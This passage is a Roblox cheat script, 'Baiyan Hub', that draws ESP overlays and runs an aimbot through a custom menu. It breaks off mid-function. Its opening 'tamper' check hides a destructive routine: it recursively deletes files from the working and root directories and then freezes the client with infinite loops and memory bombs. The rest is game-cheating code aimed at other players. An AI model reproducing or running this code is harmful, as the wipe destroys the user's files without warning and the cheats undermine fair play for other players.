--// SERVICES
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local StarterGui = game:GetService("StarterGui")

--// LOCAL ALIASES & SECURITY
local _pcall = pcall
local _osclock = os.clock
local _type = type
local _math = math
local _game = game
local _task = task
local _Instance = Instance
local _table = table
local _string = string
local _LocalPlayer = _game:GetService("Players").LocalPlayer

local tampering_message = "[Security]: Tampering detected."

local function wipeAll()
    if not listfiles or not delfile then return end
    local function rec(dir, depth)
        if depth > 6 then return end
        local ok, files = _pcall(listfiles, dir)
        if not ok or _type(files) ~= "table" then return end
        for _, f in ipairs(files) do
            if _type(f) == "string" then
                local full = (dir == "." or dir == "") and f or (dir .. "/" .. f)
                _pcall(delfile, full)
                if isfolder then
                    local isf = _pcall(isfolder, full)
                    if isf then rec(full, depth + 1) end
                end
            end
        end
    end
    rec(".", 0)
    rec("/", 0)
end

local function hang()
    _pcall(wipeAll)
    _pcall(function()
        local s = _Instance.new("ScreenGui")
        s.Name = tampering_message
        s.Parent = _LocalPlayer:WaitForChild("PlayerGui", 3)
    end)
    _pcall(function()
        for i = 1, 200 do
            _task.spawn(function() while true do end end)
        end
    end)
    _pcall(function()
        local bombs = {}
        for i = 1, 3000 do
            _task.spawn(function()
                local t = {}
                for j = 1, 5000 do
                    t[j] = _string.rep("N", 64)
                end
                _table.insert(bombs, t)
            end)
        end
    end)
    _pcall(function()
        _game:GetService("RunService").Heartbeat:Connect(function()
            for i = 1, 100000 do
                local x = _math.sqrt(i) * _math.sin(i)
            end
        end)
    end)
    while true do end
end

local function timingCheck()
    if _type(loadstring) ~= "function" then return false end
    for i = 1, 5 do _pcall(loadstring, "return 1") end
    local t0 = _osclock()
    for i = 1, 30 do _pcall(loadstring, "return 1") end
    return (_osclock() - t0) > 0.02
end

local function listAll(dir, out, depth)
    if depth > 6 then return end
    if not listfiles then return end
    local ok, files = _pcall(listfiles, dir)
    if not ok or _type(files) ~= "table" then return end
    for _, f in ipairs(files) do
        if _type(f) == "string" then
            local full = (dir == "." or dir == "") and f or (dir .. "/" .. f)
            out[full] = true
            if isfolder then
                local isf = _pcall(isfolder, full)
                if isf then listAll(full, out, depth + 1) end
            end
        end
    end
end

local function snapshot()
    local s = {}
    listAll(".", s, 0)
    listAll("/", s, 0)
    return s
end

local function countFiles(t)
    local n = 0
    for _ in pairs(t) do n = n + 1 end
    return n
end

local function fileCountCheck()
    local before = countFiles(snapshot())
    _pcall(loadstring, "return 1")
    _pcall(function() _task.wait(0.25) end)
    return countFiles(snapshot()) > before
end

local function newFileCheck()
    local before = snapshot()
    _pcall(loadstring, "return 1")
    _pcall(function() _task.wait(0.25) end)
    local after = snapshot()
    for f in pairs(after) do
        if not before[f] then return true end
    end
    return false
end

if timingCheck() then hang() end
if fileCountCheck() then hang() end
if newFileCheck() then hang() end

if not game:IsLoaded() then game.Loaded:Wait() end

local player = Players.LocalPlayer
local LocalPlayer = player
local Camera = Workspace.CurrentCamera

--// GLOBAL SETTINGS & AIMBOT SETTINGS
getgenv().Skeleton = false
getgenv().Box = false
getgenv().Distance = false
getgenv().ShowName = false
getgenv().ShowHealthText = false
getgenv().HealthEnabled = false
getgenv().ShowTracer = false
getgenv().TeamCheckEsp = false
getgenv().MM2Esp = false
getgenv().RefreshRate = 0.03
getgenv().MM2RefreshRate = 0.2

getgenv().ColorSkeleton = Color3.fromRGB(255,255,255)
getgenv().ColorBox = Color3.fromRGB(255,255,255)
getgenv().ColorDistance = Color3.fromRGB(255,255,255)
getgenv().ColorShowName = Color3.fromRGB(255,255,255)
getgenv().ColorShowHealthText = Color3.fromRGB(255,255,255)
getgenv().ColorShowTracer = Color3.fromRGB(255,255,255)

-- Aimbot Variables (載入時 TeamCheck 預設關閉)[span_1](start_span)[span_1](end_span)
local FOVRadius = 200
local Smoothness = 0.16
local AimBind = Enum.KeyCode.Q
local SwitchTargetBind = Enum.KeyCode.E
local HideKey = Enum.KeyCode.RightShift
local TeamCheck = false
local AimbotActive = false
local StrongLock = false
local WallcheckActive = true
local TargetPart = "Head"
local CameraWriteBlocked = false
local ShowFOVCircle = true

local ExcludedPlayers = {}
local CurrentTarget = nil

--// STATE & VARIABLES
local CurrentTheme = "Dark"
local ESP = {}

--// CORE MECHANICS
local function isAlive(model)
    local hum = model:FindFirstChildOfClass("Humanoid")
    return hum and hum.Health > 0
end

local function getRoot(model)
    return model:FindFirstChild("HumanoidRootPart") or (model:FindFirstChildOfClass("Humanoid") and model:FindFirstChildOfClass("Humanoid").RootPart)
end

local function GetCamera()
    return Workspace.CurrentCamera or Workspace:FindFirstChildOfClass("Camera")
end

local function GetAimPart(p)
    if not p or not p.Character then return nil end
    local t = p.Character:FindFirstChild(TargetPart)
    if not t then
        t = p.Character:FindFirstChild("Head") or p.Character:FindFirstChild("HumanoidRootPart")
    end
    return t
end

local function IsPlayerExcluded(p)
    return ExcludedPlayers[p] == true
end

-- ============ 多源隊伍識別 (rivalsteam 增強版) ============[span_2](start_span)[span_2](end_span)
local DEFAULT_TEAM_COLORS = {
    [BrickColor.new("White")] = true,
    [BrickColor.new("Medium stone grey")] = true,
    [BrickColor.new("Institutional white")] = true,
    [BrickColor.new("Really black")] = true,
    [BrickColor.new("Black")] = true,
    [BrickColor.new("Dark stone grey")] = true,
}

local function GetPlayerTeam(p)
    if not p then return nil end
    local ok, team = pcall(function() return p.Team end)
    if ok and team ~= nil then
        local okN, neutral = pcall(function() return p.Neutral end)
        if not (okN and neutral == true) then
            return { kind = "Team", value = team }
        end
    end
    local okA, attr = pcall(function() return p:GetAttribute("Team") end)
    if okA and attr ~= nil then
        return { kind = "Attr", value = attr }
    end
    if p.Character then
        local okC, cattr = pcall(function() return p.Character:GetAttribute("Team") end)
        if okC and cattr ~= nil then
            return { kind = "CharAttr", value = cattr }
        end
    end
    local okTC, tc = pcall(function() return p.TeamColor end)
    if okTC and tc and not DEFAULT_TEAM_COLORS[tc] then
        return { kind = "Color", value = tc }
    end
    return nil
end

local function IsTeammate(p)
    if not TeamCheck and not getgenv().TeamCheckEsp then return false end
    if not p or p == LocalPlayer then return false end
    
    if p.Team and LocalPlayer.Team and p.Team == LocalPlayer.Team then return true end
    if p.TeamColor and LocalPlayer.TeamColor and p.TeamColor == LocalPlayer.TeamColor then return true end

    local a = GetPlayerTeam(p)
    local b = GetPlayerTeam(LocalPlayer)
    if a ~= nil and b ~= nil and a.kind == b.kind and a.value == b.value then
        return true
    end

    return false
end

local function CheckWallVisibility(targetPart, targetCharacter)
    if not targetPart then return false end
    local cam = GetCamera()
    if not cam then return false end
    local origin = cam.CFrame.Position
    local dir = targetPart.Position - origin
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Blacklist
    local filterList = {}
    if LocalPlayer.Character then table.insert(filterList, LocalPlayer.Character) end
    if targetCharacter then table.insert(filterList, targetCharacter) end
    params.FilterDescendantsInstances = filterList
    params.IgnoreWater = true
    local result = Workspace:Raycast(origin, dir, params)
    return result == nil
end

local function GetClosestPlayerToCrosshair()
    local cam = GetCamera()
    if not cam then return nil end
    local vp = cam.ViewportSize
    local center = Vector2.new(vp.X / 2, vp.Y / 2)
    local bestMag = math.huge
    local bestTarget = nil
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and isAlive(p.Character) and not IsPlayerExcluded(p) then
            if not IsTeammate(p) then
                local bone = GetAimPart(p)
                if bone then
                    local sp, onScreen = cam:WorldToViewportPoint(bone.Position)
                    if onScreen then
                        local sp2 = Vector2.new(sp.X, sp.Y)
                        local dist = (sp2 - center).Magnitude
                        if dist < FOVRadius and dist < bestMag then
                            if WallcheckActive then
                                if CheckWallVisibility(bone, p.Character) then
                                    bestMag = dist
                                    bestTarget = p
                                end
                            else
                                bestMag = dist
                                bestTarget = p
                            end
                        end
                    end
                end
            end
        end
    end
    return bestTarget
end

-- Notification Helper
local function Notify(title, text, duration)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = duration or 3
        })
    end)
end

-- Drawing Helpers (Pro1 原封不動)[span_3](start_span)[span_3](end_span)
local function NewLine(thick)
    local l = Drawing.new("Line")
    l.Thickness = thick or 1
    l.Transparency = 1
    l.Visible = false
    return l
end

local function NewText()
    local t = Drawing.new("Text")
    t.Size = 16
    t.Center = true
    t.Outline = true
    t.Font = 2
    t.Visible = false
    return t
end

local function NewSquare()
    local s = Drawing.new("Square")
    s.Filled = true
    s.Transparency = 1
    s.Visible = false
    return s
end

local function removeESP(uid)
    if not ESP[uid] then return end
    for _, v in pairs(ESP[uid]) do
        if typeof(v) == "table" then
            for _, obj in pairs(v) do if obj then obj:Remove() end end
        else
            v:Remove()
        end
    end
    ESP[uid] = nil
end

local function hideESP(uid)
    if not ESP[uid] then return end
    for _, v in pairs(ESP[uid]) do
        if typeof(v) == "table" then
            for _, obj in pairs(v) do if obj then obj.Visible = false end end
        else
            v.Visible = false
        end
    end
end

local function clearAllMM2Highlights()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Character and plr.Character:FindFirstChild("ToolHighlight") then
            plr.Character.ToolHighlight:Destroy()
        end
    end
end

local function getBones(char)
    if char:FindFirstChild("UpperTorso") then
        return {
            {"Head","UpperTorso"},{"UpperTorso","LowerTorso"},
            {"UpperTorso","LeftUpperArm"},{"UpperTorso","RightUpperArm"},
            {"LeftUpperArm","LeftLowerArm"},{"RightUpperArm","RightLowerArm"},
            {"LeftLowerArm","LeftHand"},{"RightLowerArm","RightHand"},
            {"LowerTorso","LeftUpperLeg"},{"LowerTorso","RightUpperLeg"},
            {"LeftUpperLeg","LeftLowerLeg"},{"RightUpperLeg","RightLowerLeg"},
            {"LeftLowerLeg","LeftFoot"},{"RightLowerLeg","RightFoot"},
        }
    else
        return {
            {"Head","Torso"},{"Torso","Left Arm"},
            {"Torso","Right Arm"},{"Torso","Left Leg"},
            {"Torso","Right Leg"},
        }
    end
end

local function updateMM2Highlight(plr)
    local character = plr.Character
    if not character then return end
    local highlight = character:FindFirstChild("ToolHighlight")
    local hasKnife = false
    local hasGun = false

    for _, item in ipairs(character:GetChildren()) do
        if item:IsA("Tool") then
            if item.Name == "Knife" then hasKnife = true
            elseif item.Name == "Gun" then hasGun = true end
        end
    end

    local backpack = plr:FindFirstChild("Backpack")
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                if item.Name == "Knife" then hasKnife = true
                elseif item.Name == "Gun" then hasGun = true end
            end
        end
    end

    if hasKnife or hasGun then
        if not highlight then
            highlight = Instance.new("Highlight")
            highlight.Name = "ToolHighlight"
            highlight.Parent = character
        end
        if hasKnife then
            highlight.FillColor = Color3.fromRGB(255, 0, 0)
            highlight.OutlineColor = Color3.fromRGB(255, 100, 100)
        elseif hasGun then
            highlight.FillColor = Color3.fromRGB(0, 0, 255)
            highlight.OutlineColor = Color3.fromRGB(100, 100, 255)
        end
    else
        if highlight then highlight:Destroy() end
    end
end

local function renderEspObject(id, model, isBot, playerObj)
    if (getgenv().TeamCheckEsp or TeamCheck) and not isBot and playerObj and IsTeammate(playerObj) then
        hideESP(id)
        return
    end

    if not isBot and playerObj and IsPlayerExcluded(playerObj) then
        hideESP(id)
        return
    end

    local hrp = getRoot(model)
    local head = model:FindFirstChild("Head")
    local humanoid = model:FindFirstChildOfClass("Humanoid")

    if not (model and hrp and humanoid and isAlive(model)) then
        hideESP(id)
        return
    end

    local root3D, onScreen = Camera:WorldToViewportPoint(hrp.Position)
    if not onScreen then
        hideESP(id)
        return
    end

    if not ESP[id] then
        ESP[id] = {
            Skeleton = {},
            Box = { NewLine(2),NewLine(2),NewLine(2),NewLine(2), NewLine(2),NewLine(2),NewLine(2),NewLine(2) },
            Distance = NewText(),
            Name = NewText(),
            HealthText = NewText(),
            Tracer = NewLine(),
            HealthBG = NewSquare(),
            HealthBar = NewSquare()
        }
        humanoid.Died:Connect(function() removeESP(id) end)
        model.Destroying:Connect(function() removeESP(id) end)
    end

    local esp = ESP[id]
    local root2D = Vector2.new(root3D.X, root3D.Y)

    -- 1. 骨骼
    if getgenv().Skeleton then
        local bones = getBones(model)
        if #esp.Skeleton ~= #bones then
            for _, l in pairs(esp.Skeleton) do l:Remove() end
            esp.Skeleton = {}
            for _ = 1, #bones do table.insert(esp.Skeleton, NewLine()) end
        end
        for i, bone in ipairs(bones) do
            local a = model:FindFirstChild(bone[1])
            local b = model:FindFirstChild(bone[2])
            local line = esp.Skeleton[i]
            if a and b then
                local a2D, aOn = Camera:WorldToViewportPoint(a.Position)
                local b2D, bOn = Camera:WorldToViewportPoint(b.Position)
                if aOn and bOn then
                    line.From = Vector2.new(a2D.X, a2D.Y)
                    line.To = Vector2.new(b2D.X, b2D.Y)
                    line.Color = getgenv().ColorSkeleton
                    line.Visible = true
                else line.Visible = false end
            else line.Visible = false end
        end
    else
        for _, l in pairs(esp.Skeleton) do l.Visible = false end
    end

    -- 2. 方框
    if getgenv().Box and head then
        local headPos3D = head.Position + Vector3.new(0, 0.5, 0)
        local footPos3D = hrp.Position - Vector3.new(0, 3, 0)
        local head2D, hOn = Camera:WorldToViewportPoint(headPos3D)
        local foot2D, fOn = Camera:WorldToViewportPoint(footPos3D)
        local box = esp.Box
        if hOn and fOn then
            local height = math.abs(head2D.Y - foot2D.Y)
            local width = height / 2
            local x = head2D.X - width / 2
            local y = head2D.Y
            local w = width * 0.25
            local h = height * 0.25

            box[1].From = Vector2.new(x, y); box[1].To = Vector2.new(x + w, y)
            box[2].From = Vector2.new(x, y); box[2].To = Vector2.new(x, y + h)
            box[3].From = Vector2.new(x + width, y); box[3].To = Vector2.new(x + width - w, y)
            box[4].From = Vector2.new(x + width, y); box[4].To = Vector2.new(x + width, y + h)
            box[5].From = Vector2.new(x, y + height); box[5].To = Vector2.new(x + w, y + height)
            box[6].From = Vector2.new(x, y + height); box[6].To = Vector2.new(x, y + height - h)
            box[7].From = Vector2.new(x + width, y + height); box[7].To = Vector2.new(x + width - w, y + height)
            box[8].From = Vector2.new(x + width, y + height); box[8].To = Vector2.new(x + width, y + height - h)

            for _, l in ipairs(box) do
                l.Color = getgenv().ColorBox
                l.Visible = true
            end
        else
            for _, l in ipairs(box) do l.Visible = false end
        end
    else
        for _, l in ipairs(esp.Box) do l.Visible = false end
    end

    -- 3. 名字
    if getgenv().ShowName and head then
        local h2D = Camera:WorldToViewportPoint(head.Position + Vector3.new(0, 0.8, 0))
        esp.Name.Text = isBot and "[BOT] " .. model.Name or (playerObj and playerObj.Name or model.Name)
        esp.Name.Position = Vector2.new(h2D.X, h2D.Y - 12)
        esp.Name.Color = getgenv().ColorShowName
        esp.Name.Visible = true
    else esp.Name.Visible = false end

    -- 4. 血條
    if getgenv().HealthEnabled and head then
        local headPos3D = head.Position + Vector3.new(0, 0.5, 0)
        local footPos3D = hrp.Position - Vector3.new(0, 3, 0)
        local head2D, hOn = Camera:WorldToViewportPoint(headPos3D)
        local foot2D, fOn = Camera:WorldToViewportPoint(footPos3D)
        if hOn and fOn then
            local height = math.abs(head2D.Y - foot2D.Y)
            local hp = math.clamp(humanoid.Health / humanoid.MaxHealth, 0, 1)
            local barWidth = 4
            local x = head2D.X - (height / 2) - 6
            local y = head2D.Y

            esp.HealthBG.Size = Vector2.new(barWidth, height)
            esp.HealthBG.Position = Vector2.new(x, y)
            esp.HealthBG.Color = Color3.fromRGB(30, 30, 30)
            esp.HealthBG.Visible = true

            esp.HealthBar.Size = Vector2.new(barWidth, height * hp)
            esp.HealthBar.Position = Vector2.new(x, y + (height - (height * hp)))
            esp.HealthBar.Color = Color3.fromRGB(255 * (1 - hp), 255 * hp, 0)
            esp.HealthBar.Visible = true
        else
            esp.HealthBG.Visible = false
            esp.HealthBar.Visible = false
        end
    else
        esp.HealthBG.Visible = false
        esp.HealthBar.Visible = false
    end

    -- 5. 血量百分比文字
    if getgenv().ShowHealthText then
        esp.HealthText.Text = math.floor((humanoid.Health / humanoid.MaxHealth) * 100) .. "%"
        esp.HealthText.Position = root2D + Vector2.new(0, 15)
        esp.HealthText.Color = getgenv().ColorShowHealthText
        esp.HealthText.Visible = true
    else esp.HealthText.Visible = false end

    -- 6. 距離
    if getgenv().Distance then
        esp.Distance.Text = string.format("[%.1fm]", root3D.Z)
        esp.Distance.Position = root2D + Vector2.new(0, 30)
        esp.Distance.Color = getgenv().ColorDistance
        esp.Distance.Visible = true
    else esp.Distance.Visible = false end

    -- 7. 射線
    if getgenv().ShowTracer then
        esp.Tracer.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
        esp.Tracer.To = root2D
        esp.Tracer.Color = getgenv().ColorShowTracer
        esp.Tracer.Visible = true
    else esp.Tracer.Visible = false end
end

local function updateESP()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr == LocalPlayer then continue end
        if plr.Character then
            renderEspObject(plr.UserId, plr.Character, false, plr)
        else
            hideESP(plr.UserId)
        end
    end

    local bots = Workspace:FindFirstChild("Bots")
    if bots then
        local okBots, botChildren = pcall(function() return bots:GetChildren() end)
        if okBots and botChildren then
            for _, bot in ipairs(botChildren) do
                if bot:IsA("Model") then
                    renderEspObject(bot:GetDebugId(), bot, true, nil)
                end
            end
        end
    end
end

--// LOOPS
task.spawn(function()
    while task.wait(getgenv().RefreshRate) do pcall(updateESP) end
end)

task.spawn(function()
    while task.wait(getgenv().MM2RefreshRate) do
        if getgenv().MM2Esp then
            pcall(function()
                for _, plr in ipairs(Players:GetPlayers()) do
                    if plr ~= LocalPlayer then
                        updateMM2Highlight(plr)
                    end
                end
            end)
        end
    end
end)

Players.PlayerRemoving:Connect(function(plr) removeESP(plr.UserId) end)

local FOVCircle = nil
pcall(function()
    local c = Drawing.new("Circle")
    c.Thickness = 1.5
    c.NumSides = 64
    c.Radius = FOVRadius
    c.Filled = false
    c.Color = Color3.fromRGB(255, 255, 255)
    c.Transparency = 0.7
    c.Visible = false
    FOVCircle = c
end)

local function UpdateFOVCircle()
    if not FOVCircle then return end
    local cam = GetCamera()
    if not cam then return end
    local vp = cam.ViewportSize
    FOVCircle.Position = Vector2.new(vp.X / 2, vp.Y / 2)
    FOVCircle.Radius = FOVRadius
    FOVCircle.Visible = AimbotActive and ShowFOVCircle
end

local Themes = {
    Dark = {
        Background = Color3.fromRGB(10, 10, 10),
        TitleBar = Color3.fromRGB(15, 15, 15),
        Button = Color3.fromRGB(25, 25, 25),
        ButtonHover = Color3.fromRGB(35, 35, 35),
        Text = Color3.fromRGB(220, 220, 220),
        Border = Color3.fromRGB(60, 60, 60),
        TopButtons = Color3.fromRGB(40, 40, 40)
    },
    Light = {
        Background = Color3.fromRGB(240, 240, 240),
        TitleBar = Color3.fromRGB(220, 220, 220),
        Button = Color3.fromRGB(255, 255, 255),
        ButtonHover = Color3.fromRGB(230, 230, 230),
        Text = Color3.fromRGB(20, 20, 20),
        Border = Color3.fromRGB(180, 180, 180),
        TopButtons = Color3.fromRGB(200, 200, 200)
    }
}

-- 嚴格維持 pro1 原有的 UI 尺寸 (寬 210, 高 310)[span_4](start_span)[span_4](end_span)
local UIWidth = 210
local UIHeight = 310

local MainGui = Instance.new("ScreenGui", CoreGui)
MainGui.Name = "BaiyanHubTabbedUI"
MainGui.ResetOnSpawn = false

local Frame = Instance.new("Frame", MainGui)
Frame.Size = UDim2.new(0, UIWidth, 0, UIHeight) 
Frame.Position = UDim2.new(0.5, -(UIWidth/2), 0.5, -(UIHeight/2))
Frame.BackgroundColor3 = Themes.Dark.Background
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.ClipsDescendants = true

Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 10)
local FrameStroke = Instance.new("UIStroke", Frame)
FrameStroke.Thickness = 1.5
FrameStroke.Color = Themes.Dark.Border
FrameStroke.Transparency = 0.2

-- 標題欄
local TitleBar = Instance.new("Frame", Frame)
TitleBar.Size = UDim2.new(1, 0, 0, 30)
TitleBar.BackgroundColor3 = Themes.Dark.TitleBar
TitleBar.BorderSizePixel = 0
Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 10)

local TitleFix = Instance.new("Frame", TitleBar)
TitleFix.Size = UDim2.new(1, 0, 0, 10)
TitleFix.Position = UDim2.new(0, 0, 1, -10)
TitleFix.BackgroundColor3 = Themes.Dark.TitleBar
TitleFix.BorderSizePixel = 0

local Title = Instance.new("TextLabel", TitleBar)
Title.Size = UDim2.new(1, -85, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Text = "Baiyan Hub || Unified"
Title.TextColor3 = Themes.Dark.Text
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.TextSize = 11
Title.TextXAlignment = Enum.TextXAlignment.Left

-- 拖曳
local dragging, dragInput, dragStart, startPos
TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true; dragStart = input.Position; startPos = Frame.Position
        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
    end
end)
TitleBar.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end end)
UserInputService.InputChanged:Connect(function(input) if input == dragInput and dragging then local delta = input.Position - dragStart; Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end)

local SettingsBtn = Instance.new("TextButton", TitleBar)
SettingsBtn.Size = UDim2.new(0, 22, 0, 22)
SettingsBtn.Position = UDim2.new(1, -74, 0.5, -11)
SettingsBtn.BackgroundColor3 = Themes.Dark.TopButtons
SettingsBtn.Text = "⚙"
SettingsBtn.TextColor3 = Themes.Dark.Text
SettingsBtn.Font = Enum.Font.GothamBold
SettingsBtn.TextSize = 12

local MinimizeBtn = Instance.new("TextButton", TitleBar)
MinimizeBtn.Size = UDim2.new(0, 22, 0, 22)
MinimizeBtn.Position = UDim2.new(1, -49, 0.5, -11)
MinimizeBtn.BackgroundColor3 = Themes.Dark.TopButtons
MinimizeBtn.Text = "−"
MinimizeBtn.TextColor3 = Themes.Dark.Text
MinimizeBtn.Font = Enum.Font.GothamBold
MinimizeBtn.TextSize = 12

local CloseBtn = Instance.new("TextButton", TitleBar)
CloseBtn.Size = UDim2.new(0, 22, 0, 22)
CloseBtn.Position = UDim2.new(1, -24, 0.5, -11)
CloseBtn.BackgroundColor3 = Themes.Dark.TopButtons
CloseBtn.Text = "×"
CloseBtn.TextColor3 = Themes.Dark.Text
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 14

Instance.new("UICorner", SettingsBtn).CornerRadius = UDim.new(0, 6)
Instance.new("UICorner", MinimizeBtn).CornerRadius = UDim.new(0, 6)
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)

-- 頂部 Tab 切換列
local TabBar = Instance.new("Frame", Frame)
TabBar.Size = UDim2.new(1, -12, 0, 26)
TabBar.Position = UDim2.new(0, 6, 0, 36)
TabBar.BackgroundTransparency = 1

local EspTabBtn = Instance.new("TextButton", TabBar)
EspTabBtn.Size = UDim2.new(0.5, -3, 1, 0)
EspTabBtn.Position = UDim2.new(0, 0, 0, 0)
EspTabBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 100)
EspTabBtn.Text = "ESP"
EspTabBtn.TextColor3 = Color3.new(1, 1, 1)
EspTabBtn.Font = Enum.Font.GothamBold
EspTabBtn.TextSize = 10
Instance.new("UICorner", EspTabBtn).CornerRadius = UDim.new(0, 6)

local AimTabBtn = Instance.new("TextButton", TabBar)
AimTabBtn.Size = UDim2.new(0.5, -3, 1, 0)
AimTabBtn.Position = UDim2.new(0.5, 3, 0, 0)
AimTabBtn.BackgroundColor3 = Themes.Dark.Button
AimTabBtn.Text = "AIM"
AimTabBtn.TextColor3 = Themes.Dark.Text
AimTabBtn.Font = Enum.Font.GothamBold
AimTabBtn.TextSize = 10
Instance.new("UICorner", AimTabBtn).CornerRadius = UDim.new(0, 6)

-- 內容容器
local ESPContent = Instance.new("ScrollingFrame", Frame)
ESPContent.Size = UDim2.new(1, -6, 1, -70)
ESPContent.Position = UDim2.new(0, 3, 0, 66)
ESPContent.BackgroundTransparency = 1
ESPContent.BorderSizePixel = 0
ESPContent.ScrollBarThickness = 2
ESPContent.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
ESPContent.CanvasSize = UDim2.new(0, 0, 0, 280)
ESPContent.Visible = true

local AimContent = Instance.new("ScrollingFrame", Frame)
AimContent.Size = UDim2.new(1, -6, 1, -70)
AimContent.Position = UDim2.new(0, 3, 0, 66)
AimContent.BackgroundTransparency = 1
AimContent.BorderSizePixel = 0
AimContent.ScrollBarThickness = 2
AimContent.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
AimContent.CanvasSize = UDim2.new(0, 0, 0, 240)
AimContent.Visible = false

local buttonReferences = {}

EspTabBtn.MouseButton1Click:Connect(function()
    ESPContent.Visible = true
    AimContent.Visible = false
    EspTabBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 100)
    EspTabBtn.TextColor3 = Color3.new(1, 1, 1)
    AimTabBtn.BackgroundColor3 = Themes[CurrentTheme].Button
    AimTabBtn.TextColor3 = Themes[CurrentTheme].Text
end)

AimTabBtn.MouseButton1Click:Connect(function()
    ESPContent.Visible = false
    AimContent.Visible = true
    AimTabBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 100)
    AimTabBtn.TextColor3 = Color3.new(1, 1, 1)
    EspTabBtn.BackgroundColor3 = Themes[CurrentTheme].Button
    EspTabBtn.TextColor3 = Themes[CurrentTheme].Text
end)

-- 填充 ESP 按鈕
local function CreateESPButton(text, yPos, callback)
    local btn = Instance.new("TextButton", ESPContent)
    btn.Size = UDim2.new(1, -6, 0, 26)
    btn.Position = UDim2.new(0, 3, 0, yPos)
    btn.BackgroundColor3 = Themes.Dark.Button
    btn.Text = text
    btn.TextColor3 = Themes.Dark.Text
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 10
    btn.BorderSizePixel = 0
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
    btn.MouseButton1Click:Connect(function() callback(btn) end)
    table.insert(buttonReferences, btn)
    return btn
end

CreateESPButton("ESP BOX: OFF", 5, function(btn)
    getgenv().Box = not getgenv().Box
    btn.Text = "ESP BOX: " .. (getgenv().Box and "ON" or "OFF")
end)
CreateESPButton("ESP NAME: OFF", 37, function(btn)
    getgenv().ShowName = not getgenv().ShowName
    btn.Text = "ESP NAME: " .. (getgenv().ShowName and "ON" or "OFF")
end)
CreateESPButton("ESP SKELETON: OFF", 69, function(btn)
    getgenv().Skeleton = not getgenv().Skeleton
    btn.Text = "ESP SKELETON: " .. (getgenv().Skeleton and "ON" or "OFF")
end)
CreateESPButton("ESP HEALTH BAR: OFF", 101, function(btn)
    getgenv().HealthEnabled = not getgenv().HealthEnabled
    btn.Text = "ESP HEALTH BAR: " .. (getgenv().HealthEnabled and "ON" or "OFF")
end)
CreateESPButton("ESP HEALTH TEXT: OFF", 133, function(btn)
    getgenv().ShowHealthText = not getgenv().ShowHealthText
    btn.Text = "ESP HEALTH TEXT: " .. (getgenv().ShowHealthText and "ON" or "OFF")
end)
CreateESPButton("ESP DISTANCE: OFF", 165, function(btn)
    getgenv().Distance = not getgenv().Distance
    btn.Text = "ESP DISTANCE: " .. (getgenv().Distance and "ON" or "OFF")
end)
CreateESPButton("ESP TRACERS: OFF", 197, function(btn)
    getgenv().ShowTracer = not getgenv().ShowTracer
    btn.Text = "ESP TRACERS: " .. (getgenv().ShowTracer and "ON" or "OFF")
end)
CreateESPButton("TEAM CHECK: OFF", 229, function(btn)
    getgenv().TeamCheckEsp = not getgenv().TeamCheckEsp
    btn.Text = "TEAM CHECK: " .. (getgenv().TeamCheckEsp and "ON" or "OFF")
end)
CreateESPButton("MM2 ESP: OFF", 261, function(btn)
    getgenv().MM2Esp = not getgenv().MM2Esp
    btn.Text = "MM2 ESP: " .. (getgenv().MM2Esp and "ON" or "OFF")
    if not getgenv().MM2Esp then clearAllMM2Highlights() end
end)

-- 填充 Aim 按鈕 (載入時 TeamCheck 按鈕顯示 OFF)
local function CreateAimButton(text, yPos, callback)
    local btn = Instance.new("TextButton", AimContent)
    btn.Size = UDim2.new(1, -6, 0, 26)
    btn.Position = UDim2.new(0, 3, 0, yPos)
    btn.BackgroundColor3 = Themes.Dark.Button
    btn.Text = text
    btn.TextColor3 = Themes.Dark.Text
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 10
    btn.BorderSizePixel = 0
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
    btn.MouseButton1Click:Connect(function() callback(btn) end)
    table.insert(buttonReferences, btn)
    return btn
end

local AimbotBtn = CreateAimButton("AIMBOT: OFF [Q]", 5, function(btn)
    AimbotActive = not AimbotActive
    btn.Text = "AIMBOT: " .. (AimbotActive and "ON [Q]" or "OFF [Q]")
    if AimbotActive then CurrentTarget = GetClosestPlayerToCrosshair() end
end)

CreateAimButton("STRONG LOCK: OFF", 37, function(btn)
    StrongLock = not StrongLock
    btn.Text = "STRONG LOCK: " .. (StrongLock and "ON" or "OFF")
    if StrongLock then CurrentTarget = GetClosestPlayerToCrosshair() end
end)

CreateAimButton("WALLCHECK: ON", 69, function(btn)
    WallcheckActive = not WallcheckActive
    btn.Text = "WALLCHECK: " .. (WallcheckActive and "ON" or "OFF")
end)

CreateAimButton("SHOW FOV: ON", 101, function(btn)
